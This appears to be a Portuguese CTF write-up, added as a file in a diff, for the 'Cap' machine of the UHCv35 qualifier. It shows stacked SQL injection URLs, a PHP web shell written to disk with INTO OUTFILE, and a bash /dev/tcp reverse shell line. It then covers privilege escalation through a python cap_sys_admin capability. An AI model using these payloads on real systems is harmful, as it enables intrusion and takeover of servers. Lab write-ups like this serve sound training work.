@@ -1,0 +1,181 @@
+---
+layout: post
+title:  "UHCCTF (Classificatória) - Cap"
+tags: pt-br ctf write-up
+---
+
+Essa máquina foi feita pelo Kadu para a classificatória do UHCv35.
+
+# Recon
+
+Iniciando o desafio e pegando a url podemos observar que ele tem uma página um tanto quanto estranha, parece ser uma API, já que retorna um objeto JSON:
+
+![/assets/cap/Untitled.png](/assets/cap/Untitled.png)
+
+Vamos então partir direto para o fuzzing, vou rodar a wordlist common.txt e a quiclhits.txt:
+
+common.txt:
+
+![/assets/cap/Untitled%201.png](/assets/cap/Untitled%201.png)
+
+quickhits.txt:
+
+![/assets/cap/Untitled%202.png](/assets/cap/Untitled%202.png)
+
+Achamos um arquivo de backup! Vou baixar e abrir no visual studio code.
+
+![/assets/cap/Untitled%203.png](/assets/cap/Untitled%203.png)
+
+Hora de debugar!
+
+Esse código basicamente é uma tentativa de um tipo de API para interagir com algum tipo de banco de dados, ele pega informações de databases e é capaz de inserir informações também, podemos perceber que ele usa um micro framework chamado Slim. ([https://www.slimframework.com/docs/v2/](https://www.slimframework.com/docs/v2/))
+
+Essa parte envolve muito code review, que é inclusive o nome do challenge da primeira flag. Fui testando tudo e lendo os erros (debug mode estava ativo).
+
+Dando uma lida e debugando um pouco podemos perceber que existe uma rota dessa api que faz uma consulta no banco de dados na tabela usuarios.
+
+Rota:
+
+```bash
+https://cap.uhclabs.com/_ul/uploads/0
+```
+
+Código:
+
+![/assets/cap/Untitled%204.png](/assets/cap/Untitled%204.png)
+
+Basicamente aonde está escrito :controller é aonde vamos inserir o nome do arquivo que contém a classe que vamos usar, no caso vamos ussar o usuarios.class.php, e :parametrer sera o $data que será passado na query da consulta como podemos ver aqui:
+
+![/assets/cap/Untitled%205.png](/assets/cap/Untitled%205.png)
+
+Agora vamos rodar:
+
+Testei alguns ids e no 2 temos a primeira flag hehe:
+
+![/assets/cap/Untitled%206.png](/assets/cap/Untitled%206.png)
+
+Certo, como podemos perceber no código, nossos parâmetros não passam por nenhum tipo de tratamento, obviamente o site está vulnerável a Sql injection.
+
+![/assets/cap/Untitled%207.png](/assets/cap/Untitled%207.png)
+
+Então vamos ver o que podemos fazer aqui.
+
+# Exploitation 
+## Sql Injection
+
+Podemos observar que o banco de dados usado é o MariaDB.
+
+Vamos começar tentando mandar querys para a aplicação.
+
+Para demonstrar o que está acontecendo irei mostrar as payloads e como a query está sendo executada no site.
+
+- A primeira coisa que irei fazer vai ser tentar adicionar um usuário, ja que temos o código sabemos o nome da tabela...
+
+```bash
+cap.uhclabs.com/_ul/usuarios/1;insert%20into%20usuarios%20(nome)%20values%20('big0us')
+```
+
+Com um Url encode na nossa payload se enviarmos, a query ficará assim:
+
+```sql
+SELECT * from usuarios where id=1; insert into usuarios (nome) values ('big0us');
+```
+
+Enviando mais algumas vezes podemos ver que nosso usuário já está no banco de dados com a seguinte rota:
+
+```
+cap.uhclabs.com/_ul/usuarios/0
+```
+
+- No MariaDB existe um comando que possibilita salvar o resultado da query em um arquivo...
+- Lendo o código fonte, podemos abrir arquivos que estiverem no /classes/ apenas enviando um request POST, com o nome do arquivo sem o .classes e sem o .php...
+
+![/assets/cap/Untitled%208.png](/assets/cap/Untitled%208.png)
+
+- Se pudermos salvar arquivos de consultas de querys em qualquer diretório e podemos escrever e rodar arquivos no servidor, temos tudo para conseguir um RCE. Mas como?
+- (Existem várias formas de fazer isso vou descrever como eu fiz)
+- Já que posso criar um usuário, vou criar um usuário contendo um código php no nome, assim quando eu jogar isso para dentro de um arquivo, será executado... Então vamos as payloads:
+
+URL:
+
+```
+cap.uhclabs.com/_ul/usuarios/1;1%3Bselect%20into%20usuarios%20%28nome%29%20values%20%28%27%3C%3Fphp%20system%28%24%5FGET%5B0%5D%3F%3E%27%29%29
+```
+
+Query:
+
+```sql
+select into usuarios (nome) values ('<?php system($_GET[0]?>'))
+```
+
+E agora com o usuário criado, vamos fazer uma consulta que retorne o nome do usuário, e salvar isso em um arquivo... (dei o nome de "u")
+
+URL:
+
+```
+cap.uhclabs.com/_ul/usuarios/1%3Bselect%20%2A%20from%20usuarios%20into%20outfile%20%27%2Fvar%2Fwww%2Fhtml%2Fclasses%2Fu%2Eclass%2Ephp%27
+```
+
+Query: 
+
+```sql
+select * from usuarios into outfile '/var/www/html/classes/u.class.php'
+```
+
+Agora que já montamos nosso arquivo malicioso vamos ao request:
+
+![/assets/cap/Untitled%209.png](/assets/cap/Untitled%209.png)
+
+Agora que temos RCE vamos pegar uma shell.
+
+# Pós exploitation 
+## Root Capability
+
+Utilizei uma payload simples encodada em url encode:
+
+```bash
+bash -c "bash -i >& /dev/tcp/ip/porta 0>&1"
+```
+
+![/assets/cap/Untitled%2010.png](/assets/cap/Untitled%2010.png)
+
+```
+Full tty shell
+in your shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + Z
+in your terminal~ stty raw -echo; fg
+ENTER
+in your shell~ export TERM=xterm
+```
+
+Indo até o / podemos encontrar nossa flag!
+
+![/assets/cap/Untitled%2011.png](/assets/cap/Untitled%2011.png)
+
+Rodando alguns comandos de enumeração logo pude encontrar qual é a vulnerabilidade do priv esc (o linpeas teria achado), o comando que eu rodei para encontra-la é o getcap, que mostra para nós os capabilities que os binários do linux possuem.
+
+[Linux Capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)
+
+![/assets/cap/Untitled%2012.png](/assets/cap/Untitled%2012.png)
+
+Podemos ver que o python está com um capability chamado sys_admin, dando uma olhada no hacktricks sobre como explorar isso, podemos ver que existe uma forma de sobrescrevermos o arquivo /etc/passwd adicionando uma senha que nós sabemos para o usuário root.
+
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin)
+
+![/assets/cap/Untitled%2013.png](/assets/cap/Untitled%2013.png)
+
+Exploitation:
+
+![/assets/cap/Untitled%2014.png](/assets/cap/Untitled%2014.png)
+
+![/assets/cap/Untitled%2015.png](/assets/cap/Untitled%2015.png)
+
+![/assets/cap/Untitled%2016.png](/assets/cap/Untitled%2016.png)
+
+![/assets/cap/Untitled%2017.png](/assets/cap/Untitled%2017.png)
+
+Depois de rodar o exploit damos um:
+
+![/assets/cap/Untitled%2018.png](/assets/cap/Untitled%2018.png)
+
+E ai está nossa flag, parabéns kadu pela máquina e obrigado a você que leu até aqui!
